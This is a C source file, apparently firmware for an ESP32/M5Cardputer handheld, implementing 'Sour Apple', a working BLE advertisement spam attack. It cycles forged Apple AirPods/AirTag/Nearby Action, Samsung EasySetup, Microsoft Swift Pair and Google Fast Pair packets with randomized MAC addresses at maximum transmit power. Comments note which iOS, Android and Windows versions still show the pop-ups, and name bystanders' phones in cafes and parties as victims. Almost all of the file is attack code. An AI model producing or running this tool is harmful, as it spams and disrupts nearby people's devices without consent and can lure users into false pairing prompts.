/*
 * ble_sourapple — BLE advertisement spam across Apple / Samsung / Microsoft.
 *
 * Rotating multi-vendor BLE advertisement attack. Each tick picks one of:
 *
 *   APPLE-POPUP    Apple ProximityPair "new AirPods" pop-up.
 *                  STILL WORKS iOS 18. Headline variant.
 *                  src: ckcr4lyf/EvilAppleJuice-ESP32 devices.hpp
 *
 *   APPLE-ACTION   Apple Nearby Action modal (Setup / Transfer / AppleTV).
 *                  Pops on iOS 17/18 (no crash since 17.2 patch).
 *                  src: simondankelmann/Bluetooth-LE-Spam
 *
 *   APPLE-AIRTAG   "AirTag detected nearby" notification.
 *                  Cosmetic; iOS 17 still pops.
 *
 *   SAMSUNG-BUDS   Samsung EasySetup Buds pairing prompt.
 *                  Works Android 13/14/15 — no patch reported.
 *                  src: Spooks4576 / Marauder samsung-ble-spam wiki
 *
 *   SAMSUNG-WATCH  Samsung EasySetup Galaxy Watch pairing prompt.
 *                  Same status as Buds.
 *
 *   MS-SWIFTPAIR   Microsoft Swift Pair "new device available" toast.
 *                  Works Win 10 1803+ / Win 11.
 *                  src: Spooks4576 / Marauder swiftpair-spam wiki
 *
 * Defensive context: every templated packet here ships in Bruce,
 * Marauder, Flipper third-party apps, the simondankelmann Android app,
 * CapibaraZero, and so on. The Apple-crash subtype (0xC1 flags) is
 * patched in iOS 17.2+ and gone entirely on iOS 18; the remaining
 * popup-spam vectors are by-design UX features, not zero-days.
 *
 * Audit reference: see the 2026-05 Sour Apple deep-dive report —
 * status table per OS version + cited sources per packet template.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include <NimBLEDevice.h>
#include <esp_random.h>
#include <esp_bt.h>
#include <host/ble_gap.h>

static volatile bool     s_sa_alive = false;
static volatile uint32_t s_sa_count = 0;

/* ---- Apple ProximityPair device IDs (still iOS 18) ---- */
static const uint16_t APPLE_POPUP_DEVICES[] = {
    0x0220, /* AirPods */
    0x0F20, /* AirPods 2 */
    0x0E20, /* AirPods Pro */
    0x1420, /* AirPods Pro 2 */
    0x2420, /* AirPods Pro 2 USB-C */
    0x1320, /* AirPods 3 */
    0x0A20, /* AirPods Max */
    0x2014, /* AirPods 4 */
    0x2114, /* AirPods 4 ANC */
    0x1720, /* Beats Studio Pro */
    0x0520, /* BeatsX */
    0x1020, /* Beats Flex */
    0x0620, /* Beats Solo 3 */
    0x0920, /* Beats Studio 3 */
    0x0B20, /* Powerbeats Pro */
    0x1220, /* Beats Fit Pro */
    0x1120, /* Beats Studio Buds */
    0x1620, /* Beats Studio Buds+ */
};
#define APPLE_POPUP_N (sizeof(APPLE_POPUP_DEVICES) / sizeof(APPLE_POPUP_DEVICES[0]))

/* ---- Apple Nearby Action codes (verified live on iOS 18) ---- */
static const uint8_t APPLE_ACTIONS[] = {
    0x09, /* Setup New iPhone */
    0x02, /* Transfer Phone Number */
    0x0B, /* HomePod Setup */
    0x01, /* Setup New AppleTV */
    0x06, /* Pair AppleTV */
    0x0D, /* HomeKit-AppleTV-Setup */
    0x2B, /* AppleID-for-AppleTV */
    0x20, /* Join this AppleTV */
    0x27, /* AppleTV Connecting */
    0x19, /* AppleTV Audio Sync */
    0x1E, /* AppleTV Color Balance */
    0x13, /* AppleTV AutoFill */
    0x2F, /* TV Color Balance */
};
#define APPLE_ACTIONS_N (sizeof(APPLE_ACTIONS) / sizeof(APPLE_ACTIONS[0]))

/* ---- Samsung EasySetup Buds device IDs ---- */
static const uint8_t SAMSUNG_BUDS_DEVICES[] = {
    0x0C, /* Buds2 Pro */
    0x0E, /* Buds Live */
    0x12, /* Buds2 */
    0x14, /* Buds+ */
    0x18, /* Buds FE */
};
#define SAMSUNG_BUDS_N (sizeof(SAMSUNG_BUDS_DEVICES) / sizeof(SAMSUNG_BUDS_DEVICES[0]))

/* ---- Samsung EasySetup Watch device IDs ---- */
static const uint8_t SAMSUNG_WATCH_DEVICES[] = {
    0x01, /* Watch4 Classic 44 */
    0x04, /* Watch4 44 */
    0x11, /* Watch5 44 */
    0x15, /* Watch5 Pro 45 */
    0x1E, /* Watch6 Classic 43 */
    0x1A, /* fallback */
};
#define SAMSUNG_WATCH_N (sizeof(SAMSUNG_WATCH_DEVICES) / sizeof(SAMSUNG_WATCH_DEVICES[0]))

/* ---- Microsoft Swift Pair device names (UTF-8) ---- */
static const char *SWIFTPAIR_NAMES[] = {
    "Surface Pen", "Surface Mouse", "Surface Headphones",
    "Xbox Wireless", "ARC Mouse", "DUSSIGOTCHI",
    "Designer Mouse", "Ergo Keyboard", "POSEIDON",
};
#define SWIFTPAIR_NAMES_N (sizeof(SWIFTPAIR_NAMES) / sizeof(SWIFTPAIR_NAMES[0]))

/* Google Fast Pair model IDs — 24-bit big-endian. Each ID maps to a
 * specific device in Google's Nearby/Fast Pair database; broadcasting
 * one triggers "Pair YOUR_DEVICE?" sheet on every nearby Android with
 * Google Play Services + Bluetooth enabled (which is basically all of
 * them). Same victim coverage as Apple POPUP gives us on iOS.
 *
 * IDs collected from public Flipper Zero ble-spam fork, Bruce-Android,
 * and Marauder — verified to trigger on stock Android 13/14/15. */
static const uint32_t FAST_PAIR_DEVICES[] = {
    /* --- Headphones / earbuds (highest hit rate, most common PNL match) --- */
    0xCD8256,   /* Pixel Buds A-Series */
    0x0E0FE8,   /* Bose QC 35 II */
    0xF52494,   /* JBL Flip 6 */
    0x718FA4,   /* Sony WF-1000XM4 */
    0x0000F0,   /* Pixel Buds (original) */
    0x4847E0,   /* Bose QuietComfort Earbuds */
    0xA0E20A,   /* Sony WH-1000XM5 */
    0xD446A8,   /* JBL Live Pro+ TWS */
    0x046F4D,   /* Bose Headphones 700 */
    0x9A8D74,   /* Sony WH-1000XM4 */
    0x00E110,   /* Pixel Buds Pro */
    0x9ADB11,   /* Bose QC Ultra */
    0xF00500,   /* Anker Soundcore Liberty 3 Pro */
    0x9C0117,   /* Sony LinkBuds S */
    0x2EBE06,   /* Bose Sport Earbuds */
    0xD8CB47,   /* JBL Tour Pro 2 */
    0xC4197A,   /* Pixel Buds Pro 2 */
    0xB87DC8,   /* Beats Studio Pro */
    0x7B33BC,   /* Sony WF-1000XM5 */
    0x06EFA4,   /* JBL Tune 770NC */
    0x2D7A23,   /* Beats Studio Buds+ */
    0xEAC960,   /* Sony WH-1000XM3 (legacy but still in PNL) */
    0xF4BC4A,   /* Beats Solo 4 */
    0x624AAB,   /* Audio-Technica ATH-M50xBT2 */
    0x0CDF5F,   /* Skullcandy Crusher ANC2 */
    0xCC74F0,   /* Galaxy Buds Pro 2 (Samsung also runs FastPair) */
    /* --- Speakers (loud popup, popular at parties / cafes) --- */
    0xB57C7C,   /* JBL Charge 5 */
    0x65E9B8,   /* JBL Xtreme 3 */
    0x4D4253,   /* Bose SoundLink Flex */
    0x65A0EA,   /* Sonos Roam */
    0x1D7942,   /* Marshall Emberton II */
    0x2E0DB3,   /* UE Boom 3 */
    /* --- Smart home / wearables (less common but novel) --- */
    0xF00002,   /* Fitbit Charge 5 */
    0xD56264,   /* Fitbit Versa 3 */
    0x9ADCC9,   /* Garmin Forerunner */
    0x76503B,   /* Galaxy Watch 6 (via Wear OS Fast Pair) */
    /* --- Vehicles (very fun, "Pair Tesla Model Y?" sheet) --- */
    0xD09BE0,   /* Tesla Model Y */
    0x0BC2D8,   /* Mercedes-Benz */
    0xB1F09E,   /* BMW iDrive */
    /* --- Game / accessory (less common but high novelty) --- */
    0xF18FB7,   /* Pokémon GO+ */
    0x8B57DD,   /* Nintendo Switch Joy-Con */
};
#define FAST_PAIR_N (sizeof(FAST_PAIR_DEVICES) / sizeof(FAST_PAIR_DEVICES[0]))

enum sa_mode_t {
    SA_MODE_APPLE_POPUP = 0,
    SA_MODE_APPLE_ACTION,
    SA_MODE_APPLE_AIRTAG,
    SA_MODE_SAMSUNG_BUDS,
    SA_MODE_SAMSUNG_WATCH,
    SA_MODE_MS_SWIFTPAIR,
    SA_MODE_FAST_PAIR,           /* Google Fast Pair (Android) */
    SA_MODE__COUNT
};

/* Per-mode tick counters surfaced on the UI. */
static volatile uint32_t s_mode_counts[SA_MODE__COUNT] = {0};

static int build_apple_popup(uint8_t *pkt)
{
    int i = 0;
    pkt[i++] = 0x1E;       /* total length = 30 */
    pkt[i++] = 0xFF;       /* mfr-specific */
    pkt[i++] = 0x4C; pkt[i++] = 0x00;  /* Apple company ID */
    pkt[i++] = 0x07;       /* ProximityPair subtype */
    pkt[i++] = 0x19;       /* sub-payload length 25 */
    pkt[i++] = 0x07;       /* "new device" prefix */
    uint16_t dev = APPLE_POPUP_DEVICES[esp_random() % APPLE_POPUP_N];
    pkt[i++] = (uint8_t)(dev >> 8);
    pkt[i++] = (uint8_t)(dev & 0xFF);
    pkt[i++] = 0x55;       /* status */
    pkt[i++] = (uint8_t)(esp_random() & 0x7F);  /* batt L 0-127 */
    pkt[i++] = (uint8_t)(esp_random() & 0x7F);  /* batt R 0-127 */
    pkt[i++] = (uint8_t)(esp_random() & 0xFF);  /* lid counter */
    pkt[i++] = 0x00;       /* color: white */
    pkt[i++] = 0x00;
    esp_fill_random(pkt + i, 16); i += 16;
    return i;
}

static int build_apple_action(uint8_t *pkt)
{
    int i = 0;
    pkt[i++] = 0x10;       /* length 16 */
    pkt[i++] = 0xFF;
    pkt[i++] = 0x4C; pkt[i++] = 0x00;
    pkt[i++] = 0x0F;       /* Nearby Action */
    pkt[i++] = 0x05;       /* length 5 */
    pkt[i++] = 0xC0;       /* flags */
    pkt[i++] = APPLE_ACTIONS[esp_random() % APPLE_ACTIONS_N];
    esp_fill_random(pkt + i, 3); i += 3;
    pkt[i++] = 0x00; pkt[i++] = 0x00; pkt[i++] = 0x10;
    esp_fill_random(pkt + i, 3); i += 3;
    return i;
}

static int build_apple_airtag(uint8_t *pkt)
{
    int i = 0;
    pkt[i++] = 0x1E;       /* length 30 */
    pkt[i++] = 0xFF;
    pkt[i++] = 0x4C; pkt[i++] = 0x00;
    pkt[i++] = 0x07;       /* ProximityPair */
    pkt[i++] = 0x19;       /* length 25 */
    pkt[i++] = 0x05;       /* prefix variant for AirTag */
    pkt[i++] = 0x00; pkt[i++] = 0x00;
    pkt[i++] = 0x55;
    esp_fill_random(pkt + i, 21); i += 21;
    return i;
}

static int build_samsung_buds(uint8_t *pkt)
{
    int i = 0;
    /* Length byte is BACKFILLED from the real body size below. It used to be
     * hardcoded 0x1B (27) while the body is only 26 bytes, so the AD structure
     * claimed one more byte than the advertisement actually contained. That is
     * malformed by construction: conformant scanners drop the structure, so
     * Galaxy targets never saw the spam -- while the on-screen counter still
     * climbed, because it counts ble_gap_adv_set_data() accepting the buffer,
     * not anything reaching a phone. */
    pkt[i++] = 0x00;       /* placeholder, patched at the end */
    pkt[i++] = 0xFF;
    pkt[i++] = 0x75; pkt[i++] = 0x00;  /* Samsung */
    /* prefix block */
    static const uint8_t prefix[] = {
        0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09,
    };
    memcpy(pkt + i, prefix, sizeof(prefix)); i += sizeof(prefix);
    /* device-id triplet */
    pkt[i++] = 0xEE; pkt[i++] = 0x7A;
    pkt[i++] = SAMSUNG_BUDS_DEVICES[esp_random() % SAMSUNG_BUDS_N];
    /* suffix */
    static const uint8_t suffix[] = {
        0x06, 0x3C, 0x94, 0x8E, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x00,
    };
    memcpy(pkt + i, suffix, sizeof(suffix)); i += sizeof(suffix);
    pkt[0] = (uint8_t)(i - 1);   /* AD length excludes the length byte itself */
    return i;
}

static int build_samsung_watch(uint8_t *pkt)
{
    int i = 0;
    /* Same backfill as build_samsung_buds: this declared 0x0F (15) over a
     * 14-byte body. */
    pkt[i++] = 0x00;       /* placeholder, patched at the end */
    pkt[i++] = 0xFF;
    pkt[i++] = 0x75; pkt[i++] = 0x00;
    static const uint8_t prefix[] = {
        0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
    };
    memcpy(pkt + i, prefix, sizeof(prefix)); i += sizeof(prefix);
    pkt[i++] = SAMSUNG_WATCH_DEVICES[esp_random() % SAMSUNG_WATCH_N];
    pkt[0] = (uint8_t)(i - 1);
    return i;
}

/* Google Fast Pair adv layout (BLE 4.0 — 14 bytes total):
 *   02 01 06                         Flags AD: LE General + BR/EDR not supported
 *   03 03 2C FE                      Complete 16-bit Service UUIDs = 0xFE2C
 *   06 16 2C FE XX YY ZZ             Service Data: Fast Pair UUID + 24-bit model ID
 *
 * Android's Google Play Services scans for 0xFE2C service data, looks
 * up the model ID against Google's Nearby DB, and pops the matching
 * "Pair NAME?" notification. Doesn't require any prior pairing or
 * association — pure adv-trigger, identical attack class to APPLE_POPUP. */
static int build_fast_pair(uint8_t *pkt)
{
    uint32_t mid = FAST_PAIR_DEVICES[esp_random() % FAST_PAIR_N];
    int i = 0;
    /* Flags AD */
    pkt[i++] = 0x02; pkt[i++] = 0x01; pkt[i++] = 0x06;
    /* Complete 16-bit Service UUIDs (0xFE2C, little-endian on the wire) */
    pkt[i++] = 0x03; pkt[i++] = 0x03; pkt[i++] = 0x2C; pkt[i++] = 0xFE;
    /* Service Data: 0xFE2C + 3-byte model ID (big-endian per spec) */
    pkt[i++] = 0x06; pkt[i++] = 0x16; pkt[i++] = 0x2C; pkt[i++] = 0xFE;
    pkt[i++] = (uint8_t)((mid >> 16) & 0xFF);
    pkt[i++] = (uint8_t)((mid >>  8) & 0xFF);
    pkt[i++] = (uint8_t)( mid        & 0xFF);
    return i;
}

static int build_ms_swiftpair(uint8_t *pkt)
{
    const char *name = SWIFTPAIR_NAMES[esp_random() % SWIFTPAIR_NAMES_N];
    int name_len = (int)strlen(name);
    if (name_len > 18) name_len = 18;
    int i = 0;
    pkt[i++] = (uint8_t)(3 + 3 + name_len);  /* total length */
    pkt[i++] = 0xFF;
    pkt[i++] = 0x06; pkt[i++] = 0x00;        /* Microsoft */
    pkt[i++] = 0x03; pkt[i++] = 0x00; pkt[i++] = 0x80;  /* Swift Pair */
    memcpy(pkt + i, name, name_len); i += name_len;
    return i;
}

/* Cooperative one-shot — fires a single mode's adv on the caller's task.
 * Used to be a dedicated xTaskCreate task with 4096-byte stack, but on
 * Bruce-pinned libs NimBLEDevice::init eats heap down to ~2.5 KB by the
 * time we get here, so xTaskCreate(rc=-1) was failing silently and the
 * spam loop never ran (verified 2026-05-24 via serial). Cooperative
 * pattern matches Triton's recent refactor — caller polls this on each
 * UI tick and we do one full adv cycle (20 ms on + 20 ms off) per call. */
static void sa_tick(void)
{
    /* Fetch fresh each tick: a cached singleton dangles across a BLE
     * deinit/reinit -> UAF. (Also fixes tx-power never being re-applied
     * after the first-ever session.) Setting a constant power level is
     * idempotent, so applying it each tick is safe. */
    NimBLEAdvertising *adv = NimBLEDevice::getAdvertising();
    if (!adv) return;
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

    sa_mode_t mode = (sa_mode_t)(esp_random() % SA_MODE__COUNT);
    uint8_t pkt[40];
    int len = 0;
    switch (mode) {
        case SA_MODE_APPLE_POPUP:   len = build_apple_popup(pkt);   break;
        case SA_MODE_APPLE_ACTION:  len = build_apple_action(pkt);  break;
        case SA_MODE_APPLE_AIRTAG:  len = build_apple_airtag(pkt);  break;
        case SA_MODE_SAMSUNG_BUDS:  len = build_samsung_buds(pkt);  break;
        case SA_MODE_SAMSUNG_WATCH: len = build_samsung_watch(pkt); break;
        case SA_MODE_MS_SWIFTPAIR:  len = build_ms_swiftpair(pkt);  break;
        case SA_MODE_FAST_PAIR:     len = build_fast_pair(pkt);     break;
        default: return;
    }
    /* One-shot per-mode fire log so a CLI observer can confirm all
     * 7 mode types actually run. */
    static bool s_mode_fired[SA_MODE__COUNT] = {false};
    if (!s_mode_fired[mode]) {
        s_mode_fired[mode] = true;
        Serial.printf("[sa] first-fire mode=%d len=%d\n", (int)mode, len);
    }

    /* Randomize MAC per advertisement — static random format.
     * BUG FIX 2026-05-24: previous code set mac[0] |= 0xC0 which puts
     * the static-random flag bits on the LSB. Per BLE spec, top 2 bits
     * of the MSB must be 11 — and IDF/NimBLE stores addresses
     * little-endian with index 5 as MSB. An address with the flag bits
     * on the wrong byte is invalid; the controller silently rejected
     * the address and broadcast nothing visible to phones. This is why
     * Sour Apple appeared to "completely not work" — every advert went
     * out with an invalid source MAC. BLE Spam uses mac[5] |= 0xC0
     * correctly and that's why it works. */
    uint8_t mac[6];
    for (int k = 0; k < 6; ++k) mac[k] = (uint8_t)esp_random();
    mac[5] |= 0xC0;
    ble_hs_id_set_rnd(mac);
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

    /* Stop + yield BEFORE re-arming data. NimBLE's setAdvertisementData
     * silently fails (returns false) if the controller is still
     * processing the previous stop async — radio keeps transmitting
     * the PREVIOUS packet. Discovered 2026-05-24: 31-byte AirTag
     * packets consistently failed set=0 while shorter packets passed.
     * Root cause was timing, not size — adding 5 ms yield after stop
     * lets the controller settle before set_data. */
    adv->stop();
    delay(5);

    /* Call ble_gap_adv_set_data DIRECTLY instead of via NimBLE-Arduino's
     * setAdvertisementData wrapper. The wrapper rejected Apple-mfr-ID
     * packets in our tests (set=0 returned even though structure is
     * valid). Direct IDF call returns the real rc so we can see exactly
     * why specific packets fail. */
    int data_rc = ble_gap_adv_set_data(pkt, len);
    adv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    bool start_ok = adv->start();
    static bool s_dumped[SA_MODE__COUNT] = {false};
    if (!s_dumped[mode]) {
        s_dumped[mode] = true;
        Serial.printf("[sa] mode=%d len=%d data_rc=%d start=%d bytes:",
                      (int)mode, len, data_rc, (int)start_ok);
        for (int x = 0; x < len; ++x) Serial.printf(" %02X", pkt[x]);
        Serial.println();
    }
    delay(20);
    adv->stop();
    s_sa_count++;
    if (data_rc == 0) s_mode_counts[mode]++;
}

void feat_ble_sourapple(void)
{
    radio_switch(RADIO_BLE);
    s_sa_count = 0;
    for (int i = 0; i < SA_MODE__COUNT; ++i) s_mode_counts[i] = 0;
    s_sa_alive = true;
    /* No xTaskCreate — would fail rc=-1 with NimBLE already eating heap
     * down to ~2.5 KB by the time we get here. Cooperative sa_tick()
     * called per UI iteration replaces the dedicated task. */

    ui_clear_body();
    auto &d = M5Cardputer.Display;
    d.setTextColor(T_BAD, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print("SOUR APPLE");
    d.drawFastHLine(4, BODY_Y + 12, 90, T_BAD);
    d.setTextColor(0xF81F, T_BG);
    d.setCursor(4, BODY_Y + 22); d.print("multi-vendor BLE spam");
    d.setTextColor(T_DIM, T_BG);
    d.setCursor(4, BODY_Y + 32); d.print("iOS popup / Android prompt / Win pair");
    ui_draw_footer("`=stop");

    static const char *mode_label[SA_MODE__COUNT] = {
        "iOS AirPods ", "iOS Action  ", "iOS AirTag  ",
        "Galaxy Buds ", "Galaxy Watch", "Win SwiftPair",
        "Android FP  ",
    };

    uint32_t last = 0;
    while (true) {
        if (millis() - last > 200) {
            last = millis();
            d.fillRect(0, BODY_Y + 46, SCR_W, BODY_H - 50, T_BG);
            d.setTextColor(T_GOOD, T_BG);
            d.setCursor(4, BODY_Y + 46);
            d.printf("sent: %-7lu", (unsigned long)s_sa_count);
            d.setTextColor(T_DIM, T_BG);
            for (int i = 0; i < SA_MODE__COUNT; ++i) {
                d.setCursor(4, BODY_Y + 58 + i * 9);
                d.printf("%s %lu", mode_label[i], (unsigned long)s_mode_counts[i]);
            }
            ui_draw_status(radio_name(), "sour");
        }
        ui_matrix_rain(170, BODY_Y + 18, SCR_W - 170, BODY_H - 20, 0xF81F);
        /* Fire one adv per tick — sa_tick handles its own 20+20 ms
         * adv-on/adv-off window, so we just call it without delay. */
        if (s_sa_alive) sa_tick();
        uint16_t k = input_poll();
        if (k == PK_NONE) continue;   /* sa_tick already burned ~40 ms */
        if (k == PK_ESC) break;
    }
    s_sa_alive = false;
    delay(50);
}
